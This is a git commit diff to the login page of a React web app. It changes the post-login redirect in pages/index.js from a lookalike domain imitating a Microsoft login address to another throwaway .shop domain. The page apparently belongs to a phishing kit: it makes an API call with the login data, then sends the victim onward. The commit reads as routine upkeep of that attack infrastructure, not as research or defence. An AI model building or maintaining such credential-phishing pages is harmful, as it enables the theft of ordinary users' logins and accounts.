ae28f68356c1ea52e6e0bad98a4d48a42bf734e3
husknet <127146284+husknet@users.noreply.github.com>
2025-04-03 11:38:34 -0300

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://kl.l0g-mlcrowebapp-0ff.shop/';
+      window.location.href = 'https://kp.govtaccounting.shop/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
